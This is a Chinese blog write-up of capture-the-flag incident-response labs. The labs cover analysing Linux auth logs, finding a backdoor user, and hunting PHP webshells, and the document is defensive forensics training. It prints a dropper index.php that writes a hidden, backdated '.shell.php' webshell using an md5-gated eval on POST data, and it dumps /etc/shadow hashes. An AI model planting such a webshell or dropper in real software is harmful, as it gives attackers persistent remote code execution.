+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Failed password for root&quot;</span> | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Accepted&quot;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br><span class="line">      1 Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 46563 ssh2</span><br><span class="line">      1 Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 48070 ssh2</span><br></pre></td></tr></table></figure></div>
+
+<p>成功登录的是192.168.200.2的ip，一共4次</p>
+<p>所以flag:<code>flag&#123;4&#125;</code></p>
+<h2 id="步骤5"><a href="#步骤5" class="headerlink" title="步骤5"></a>步骤5</h2><blockquote>
+<p>5.黑客登陆主机后新建了一个后门用户，用户名是多少</p>
+</blockquote>
+<p>通常与用户登录和用户管理活动相关的日志文件是 <code>/var/log/auth.log</code> 或其备份文件如 <code>/var/log/auth.log.1</code>。</p>
+<p>我们直接<code>users</code>，是看不到的，在看备份文件前，我们可以先看看<code>/etc/shadow</code>。</p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:~# <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$6$V5ItX87cUllL5G4h<span class="variable">$yATBAGCLFnkAoW4erj4cBGT9mXg3kdqkItr8xX</span>.64LJwsq48qDeukrTkOwoTE6TSYnaTDfSRvpWiq/BIMmhom/:19570:0:99999:7:::</span><br><span class="line">daemon:*:19314:0:99999:7:::</span><br><span class="line">bin:*:19314:0:99999:7:::</span><br><span class="line">sys:*:19314:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19314:0:99999:7:::</span><br><span class="line">games:*:19314:0:99999:7:::</span><br><span class="line">man:*:19314:0:99999:7:::</span><br><span class="line">lp:*:19314:0:99999:7:::</span><br><span class="line">mail:*:19314:0:99999:7:::</span><br><span class="line">news:*:19314:0:99999:7:::</span><br><span class="line">uucp:*:19314:0:99999:7:::</span><br><span class="line">proxy:*:19314:0:99999:7:::</span><br><span class="line">www-data:*:19314:0:99999:7:::</span><br><span class="line">backup:*:19314:0:99999:7:::</span><br><span class="line">list:*:19314:0:99999:7:::</span><br><span class="line">irc:*:19314:0:99999:7:::</span><br><span class="line">gnats:*:19314:0:99999:7:::</span><br><span class="line">nobody:*:19314:0:99999:7:::</span><br><span class="line">_apt:*:19314:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19314:0:99999:7:::</span><br><span class="line">systemd-network:*:19314:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19314:0:99999:7:::</span><br><span class="line">messagebus:*:19314:0:99999:7:::</span><br><span class="line">unscd:*:19314:0:99999:7:::</span><br><span class="line">ntp:*:19314:0:99999:7:::</span><br><span class="line">sshd:*:19314:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:19322::::::</span><br><span class="line">test2:$6$oIpMwQHVAWKNjsi1<span class="variable">$kMV6ZNSOTZfqnNSxqMkl9tLj</span>/1Y5KOJMZBzCu.qQgFxezvXrn..gHkt8lieFTDVCUI0PhVASNpZvKCJwsN3gH1:19570:0:99999:7:::</span><br><span class="line">debian:!:19570:0:99999:7:::</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>可以很明确的看到两个特长的密码，猜测test2为新创的隐藏用户。为了进一步的验证，我们还是去看看日志文件比较好。</p>
+<p>而且我们只能在备份的文件里面看到new的内容。</p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:~# <span class="built_in">cd</span> /var/log</span><br><span class="line">root@ip-10-0-10-1:/var/log# <span class="built_in">cat</span> auth.log | grep -a <span class="string">&quot;new&quot;</span></span><br><span class="line">root@ip-10-0-10-1:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;new&quot;</span></span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new group: name=debian, GID=1001</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>我们还可以 结合其他日志文件，如 <code>/var/log/syslog</code>，查看是否有异常的命令执行或系统变更。但是好像这个环境没什么异常。</p>
+<p>所以flag:<code>flag&#123;test2&#125;</code></p>
+<h1 id="第一章-应急响应-Linux入侵排查"><a href="#第一章-应急响应-Linux入侵排查" class="headerlink" title="第一章 应急响应- Linux入侵排查"></a>第一章 应急响应- Linux入侵排查</h1><blockquote>
+<p>简介</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;账号：root 密码：linuxruqin</span><br><span class="line">&gt;ssh root@IP</span><br><span class="line">&gt;1.web目录存在木马，请找到木马的密码提交</span><br><span class="line">&gt;2.服务器疑似存在不死马，请找到不死马的密码提交</span><br><span class="line">&gt;3.不死马是通过哪个文件生成的，请提交文件名</span><br><span class="line">&gt;4.黑客留下了木马文件，请找出黑客的服务器ip提交</span><br><span class="line">&gt;5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</span><br></pre></td></tr></table></figure></div></blockquote>
+<h2 id="步骤1-2"><a href="#步骤1-2" class="headerlink" title="步骤1"></a>步骤1</h2><blockquote>
+<p>web目录存在木马，请找到木马的密码提交</p>
+</blockquote>
+<p>用下面的命令</p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;eval&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>解释</p>
+<blockquote>
+<p>这行命令的作用是查找当前目录及其子目录下所有 <code>.php</code> 文件中包含 <code>eval</code> 字符串的行。</p>
+<p>具体解释如下：</p>
+<ol>
+<li><code>find . -type f -name &quot;*.php&quot;</code>：</li>
+</ol>
+<ul>
+<li><code>find</code> 是用来在文件系统中查找文件的命令。</li>
+<li><code>.</code> 表示从当前目录开始查找。</li>
+<li><code>-type f</code> 表示查找类型为文件（而非目录、链接等其他类型）的文件。</li>
+<li><code>-name &quot;*.php&quot;</code> 表示查找所有扩展名为 <code>.php</code> 的文件。</li>
+</ul>
+<p> 这部分命令会返回所有 <code>.php</code> 文件的路径。</p>
+<ol start="2">
+<li><p><code>|</code>：<br> 管道符号 <code>|</code> 将前一个命令的输出传递给后一个命令。</p>
+</li>
+<li><p><code>xargs grep &quot;eval&quot;</code>：</p>
+</li>
+</ol>
+<ul>
+<li><code>xargs</code> 是一个将标准输入转换为命令行参数的工具。在这里，它将 <code>find</code> 命令输出的 <code>.php</code> 文件列表传递给 <code>grep</code> 命令。</li>
+<li><code>grep &quot;eval&quot;</code> 是用来搜索文件中包含 <code>eval</code> 字符串的行。</li>
+</ul>
+<p> 所以，<code>xargs grep &quot;eval&quot;</code> 会在之前通过 <code>find</code> 查找到的所有 <code>.php</code> 文件中，搜索并显示包含 <code>eval</code> 字符串的行。</p>
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>这行命令通过 <code>find</code> 查找所有 <code>.php</code> 文件，再用 <code>grep</code> 检查这些文件中是否包含 <code>eval</code> 代码。<code>eval</code> 是 PHP 中的一个危险函数，它会执行传入的字符串代码，常常被用来执行动态生成的代码。</p>
+</blockquote>
+<p>可以发现有三个文件中存在。</p>
+<p>我们依次去看看具体的文件内容。会发现只有1.php是简单的一句话木马。而另外两个像是通过index.php生成了隐藏文件<code>.shell.php</code>。</p>
+<p>我们的第二步骤里面是找不死马，所以可以明确一点是1.php是步骤1里面我们需要的普通木马，而后面的<code>.shell.php</code>是步骤2的不死马。</p>
+<p>flag:<code>flag&#123;1&#125;</code></p>
+<h2 id="步骤2-2"><a href="#步骤2-2" class="headerlink" title="步骤2"></a>步骤2</h2><blockquote>
+<p>服务器疑似存在不死马，请找到不死马的密码提交</p>
+</blockquote>
+<p>在前面已经分析过不死马对应的是哪个文件，这里的密码对应的是md5加密的部分，而不是连接的密码。我们拿去爆破解密就行了。</p>
+<p>flag:<code>flag&#123;hello&#125;</code></p>
+<h2 id="步骤3-2"><a href="#步骤3-2" class="headerlink" title="步骤3"></a>步骤3</h2><blockquote>
+<p>不死马是通过哪个文件生成的，请提交文件名</p>
+</blockquote>
+<p>这个前面也分析过了，是用index.php生成了一个.shell.php。</p>
+<div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ip-<span class="number">10</span>-<span class="number">0</span>-<span class="number">10</span>-<span class="number">1</span>:/<span class="keyword">var</span>/www/html<span class="comment"># cat index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(SYS_ROOT.INC.<span class="string">&#x27;common.php&#x27;</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>].(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]?<span class="string">&#x27;?&#x27;</span>.<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]):<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$path</span>, <span class="number">0</span>,<span class="number">1</span>)==<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$path</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$path</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$path</span> = <span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$ctrl</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]:<span class="string">&#x27;run&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;createprocess&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="title class_">Index</span>::<span class="title function_ invoke__">createhtml</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="number">0</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;single&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title class_">Index</span>::<span class="title function_ invoke__">run</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/var/www/html/.shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>看一下<code>.shell.php</code></p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:/var/www/html# <span class="built_in">cat</span> .shell.php</span><br><span class="line">&lt;?php <span class="keyword">if</span>(md5(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>])==<span class="string">&quot;5d41402abc4b2a76b9719d911017c592&quot;</span>)&#123;@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[cmd]);&#125;?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>flag:<code>flag&#123;index.php&#125;</code></p>
+<h2 id="步骤4-2"><a href="#步骤4-2" class="headerlink" title="步骤4"></a>步骤4</h2><blockquote>
+<p>黑客留下了木马文件，请找出黑客的服务器ip提交</p>
+</blockquote>
+<p>我们先去<code>/var/log</code>下面寻找对应的日志文件。</p>
+<p>先看<code>auth.log</code>里面有没有进行暴力破解的痕迹</p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:/var/log# <span class="built_in">cat</span> auth.log</span><br><span class="line">Apr  2 02:52:37 ip-10-0-10-1 sshd[833]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=223.104.67.124  user=root</span><br><span class="line">Apr  2 02:52:38 ip-10-0-10-1 sshd[833]: Failed password <span class="keyword">for</span> root from 223.104.67.124 port 62100 ssh2</span><br><span class="line">Apr  2 02:52:50 ip-10-0-10-1 sshd[833]: Accepted password <span class="keyword">for</span> root from 223.104.67.124 port 62100 ssh2</span><br><span class="line">Apr  2 02:52:50 ip-10-0-10-1 sshd[833]: pam_unix(sshd:session): session opened <span class="keyword">for</span> user root by (uid=0)</span><br><span class="line">Apr  2 02:52:50 ip-10-0-10-1 systemd-logind[430]: New session 1 of user root.</span><br><span class="line">Apr  2 02:52:50 ip-10-0-10-1 systemd: pam_unix(systemd-user:session): session opened <span class="keyword">for</span> user root by (uid=0)</span><br><span class="line">Apr  2 02:56:05 ip-10-0-10-1 sshd[858]: Invalid user 0 from 185.246.128.133 port 6750</span><br><span class="line">Apr  2 02:56:05 ip-10-0-10-1 sshd[858]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Apr  2 02:56:05 ip-10-0-10-1 sshd[858]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=185.246.128.133</span><br><span class="line">Apr  2 02:56:07 ip-10-0-10-1 sshd[858]: Failed password <span class="keyword">for</span> invalid user 0 from 185.246.128.133 port 6750 ssh2</span><br><span class="line">Apr  2 02:56:09 ip-10-0-10-1 sshd[858]: Connection reset by invalid user 0 185.246.128.133 port 6750 [preauth]</span><br></pre></td></tr></table></figure></div>
+
+<p>发现日志文件里面是不存在有shell.php的</p>
+<p>再看登录成功的IP提交发现不对</p>
+<p>重新看看有没有新线索，发现html下面有一个可疑的elf文件，linux中的可执行文件</p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:~# netstat -antlp | more</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      577/mysqld</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      505/sshd</span><br><span class="line">tcp        0      1 10.0.10.1:38474         10.11.55.21:3333        SYN_SENT    967/./shell(1).elf</span><br><span class="line">tcp        0      0 10.0.10.1:22            223.104.67.124:62100    ESTABLISHED 833/sshd: root@pts/</span><br><span class="line">tcp        0     36 10.0.10.1:22            223.104.67.124:62102    ESTABLISHED 971/sshd: root@pts/</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      513/apache2</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      505/sshd</span><br></pre></td></tr></table></figure></div>
+
+<p>所以flag:<code>flag&#123;10.11.55.21&#125;</code></p>
+<h2 id="步骤5-1"><a href="#步骤5-1" class="headerlink" title="步骤5"></a>步骤5</h2><blockquote>
+<p>黑客留下了木马文件，请找出黑客服务器开启的监端口提交</p>
+</blockquote>
+<p>在步骤4里面已经分析过了，里面也有对应的端口号直接提交即可。</p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:~# netstat -antlp | more</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      577/mysqld</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      505/sshd</span><br><span class="line">tcp        0      1 10.0.10.1:38474         10.11.55.21:3333        SYN_SENT    967/./shell(1).elf</span><br><span class="line">tcp        0      0 10.0.10.1:22            223.104.67.124:62100    ESTABLISHED 833/sshd: root@pts/</span><br><span class="line">tcp        0     36 10.0.10.1:22            223.104.67.124:62102    ESTABLISHED 971/sshd: root@pts/</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      513/apache2</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      505/sshd</span><br></pre></td></tr></table></figure></div>
+
+<p>所以flag:<code>flag&#123;3333&#125;</code></p>
+<h1 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/administratorlws/article/details/139560740">玄机——第一章 应急响应-Linux日志分析 wp</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/mash1r0-12d0u/nmeyw6/rsubnt6nw6gk16i5">Mash1r0-第一章 应急响应-Linux日志分析</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/link/">Link</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80"><span class="toc-number">1.</span> <span class="toc-text">第一章 应急响应-webshell查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41"><span class="toc-number">1.1.</span> <span class="toc-text">步骤1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%90%AF%E5%8A%A8%E4%BC%9A%E8%AF%9D%E4%B8%8E%E7%A6%81%E7%94%A8%E9%94%99%E8%AF%AF%E6%8A%A5%E5%91%8A"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">1. 启动会话与禁用错误报告</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-encode-%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">2. encode 函数定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%95%B0%E6%8D%AE%E8%8E%B7%E5%8F%96%E4%B8%8E%E5%A4%84%E7%90%86"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">3. 数据获取与处理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E4%B8%8E%E4%BC%9A%E8%AF%9D%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">4. 数据加密与会话检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%BD%9C%E5%9C%A8%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">5. 潜在的安全问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.2.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42"><span class="toc-number">1.2.</span> <span class="toc-text">步骤2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43"><span class="toc-number">1.3.</span> <span class="toc-text">步骤3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44"><span class="toc-number">1.4.</span> <span class="toc-text">步骤4</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">第一章 应急响应-Linux日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41-1"><span class="toc-number">2.1.</span> <span class="toc-text">步骤1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E8%BD%AE%E8%BD%AC%E6%9C%BA%E5%88%B6%EF%BC%88logrotate%EF%BC%89%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">日志轮转机制（logrotate）简介：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E7%94%A8%E5%AE%83%E4%BB%AC%EF%BC%9F"><span class="toc-number">2.1.2.</span> <span class="toc-text">怎么用它们？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">2.1.3.</span> <span class="toc-text">完整命令：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E9%83%A8%E5%88%86%E5%90%AB%E4%B9%89%EF%BC%9A"><span class="toc-number">2.1.4.</span> <span class="toc-text">各部分含义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E6%95%88%E6%9E%9C%EF%BC%9A"><span class="toc-number">2.1.5.</span> <span class="toc-text">最终效果：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%94%A8%E5%BB%BA%E8%AE%AE%EF%BC%9A"><span class="toc-number">2.1.6.</span> <span class="toc-text">实用建议：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42-1"><span class="toc-number">2.2.</span> <span class="toc-text">步骤2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43-1"><span class="toc-number">2.3.</span> <span class="toc-text">步骤3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A41"><span class="toc-number">2.3.1.</span> <span class="toc-text">命令1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A42"><span class="toc-number">2.3.2.</span> <span class="toc-text">命令2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44-1"><span class="toc-number">2.4.</span> <span class="toc-text">步骤4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A45"><span class="toc-number">2.5.</span> <span class="toc-text">步骤5</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="toc-number">3.</span> <span class="toc-text">第一章 应急响应- Linux入侵排查</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41-2"><span class="toc-number">3.1.</span> <span class="toc-text">步骤1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">3.1.1.</span> <span class="toc-text">总结：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42-2"><span class="toc-number">3.2.</span> <span class="toc-text">步骤2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43-2"><span class="toc-number">3.3.</span> <span class="toc-text">步骤3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44-2"><span class="toc-number">3.4.</span> <span class="toc-text">步骤4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A45-1"><span class="toc-number">3.5.</span> <span class="toc-text">步骤5</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E6%96%87%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">本文参考</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
